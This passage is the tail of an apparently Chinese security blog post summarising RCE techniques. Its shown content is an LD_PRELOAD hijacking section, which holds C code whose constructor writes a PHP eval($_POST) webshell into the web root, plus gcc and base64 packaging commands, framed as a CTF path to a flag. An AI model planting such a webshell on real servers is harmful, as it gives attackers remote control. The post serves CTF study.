+<p>思路是：劫持之后上马，suid提权查看flag</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;&lt;?php echo 1;eval($_POST[1])?&gt;&#x27; &gt; /var/www/html/shell.php&quot;</span>);</span><br><span class="line">        </span><br><span class="line">&#125;   </span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC evil.c -o evil.so</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> evil.so|<span class="built_in">base64</span> &gt;evil.txt</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8E%E7%BB%88%E7%AB%AF%E7%89%B9%E6%80%A7%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">命令执行 - 基于终端特性的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shell%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.1.</span> <span class="toc-text">shell输入输出重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number">1.1.1.</span> <span class="toc-text">文件描述符</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.2.</span> <span class="toc-text">linux 逻辑运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.3.</span> <span class="toc-text">linux 命令替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E7%AE%97%E6%9C%AF%E6%8B%93%E5%B1%95"><span class="toc-number">1.4.</span> <span class="toc-text">linux 算术拓展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E5%8F%82%E6%95%B0%E6%89%A9%E5%B1%95"><span class="toc-number">1.5.</span> <span class="toc-text">linux 参数扩展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.6.</span> <span class="toc-text">过滤空格</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.6.1.</span> <span class="toc-text">大括号{}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E5%AD%97%E6%AE%B5%E5%88%86%E9%9A%94%E7%AC%A6IFS"><span class="toc-number">1.6.2.</span> <span class="toc-text">内部字段分隔符IFS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6"><span class="toc-number">1.6.3.</span> <span class="toc-text">重定向符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%97%B4%E9%9A%94%E7%AC%A6"><span class="toc-number">1.6.4.</span> <span class="toc-text">其他间隔符</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%90%8D-%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">1.7.</span> <span class="toc-text">命令名&amp;文件名过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">1.7.1.</span> <span class="toc-text">通配符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">注意点</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F"><span class="toc-number">1.7.2.</span> <span class="toc-text">特殊变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7-%E5%8F%8C%E5%BC%95%E5%8F%B7-%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="toc-number">1.7.3.</span> <span class="toc-text">单引号 双引号 反引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E7%BA%BF"><span class="toc-number">1.7.4.</span> <span class="toc-text">反斜线\</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.7.5.</span> <span class="toc-text">拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8linux%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">1.7.6.</span> <span class="toc-text">利用linux中的环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6-linux%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.7.7.</span> <span class="toc-text">管道符&amp;linux命令替换</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#printf"><span class="toc-number">1.7.7.1.</span> <span class="toc-text">printf</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E5%91%BD%E4%BB%A4%E6%90%AD%E9%85%8D%E9%80%9A%E9%85%8D%E7%AC%A6RCE"><span class="toc-number">1.7.8.</span> <span class="toc-text">绝对命令搭配通配符RCE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">1.8.</span> <span class="toc-text">查看目录的命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%90%84%E7%A7%8D%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.9.</span> <span class="toc-text">Linux各种读取文件的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">1.10.</span> <span class="toc-text">无回显RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce"><span class="toc-number">1.11.</span> <span class="toc-text">bash无字母数字rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6rce"><span class="toc-number">1.12.</span> <span class="toc-text">bash长度限制rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-bypass%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.</span> <span class="toc-text">php-bypass空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%B8%8D%E9%9C%80%E8%A6%81%E6%8B%AC%E5%8F%B7%E7%9A%84%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">php不需要括号的敏感函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">php函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.</span> <span class="toc-text">php无参数RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE"><span class="toc-number">6.</span> <span class="toc-text">php无字母数字RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">6.0.1.</span> <span class="toc-text">临时文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0RCE"><span class="toc-number">7.</span> <span class="toc-text">php数学函数RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FRCE"><span class="toc-number">8.</span> <span class="toc-text">环境变量RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E5%9C%A8%E9%87%8E%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">通配符在野注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cp%E6%8C%87%E4%BB%A4%E5%8F%82%E6%95%B0"><span class="toc-number">9.0.1.</span> <span class="toc-text">cp指令参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9A%84%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99%EF%BC%88Shell-Globbing%EF%BC%89"><span class="toc-number">9.0.2.</span> <span class="toc-text">* 的解析规则（Shell Globbing）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD%E5%8A%AB%E6%8C%81"><span class="toc-number">10.</span> <span class="toc-text">LD_PRELOAD劫持</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&text=RCE总结"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&title=RCE总结"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&is_video=false&description=RCE总结"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCE总结&body=Check out this article: http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&title=RCE总结"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&title=RCE总结"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&title=RCE总结"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&title=RCE总结"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&name=RCE总结&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/28/RCE%E6%80%BB%E7%BB%93/&t=RCE总结"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
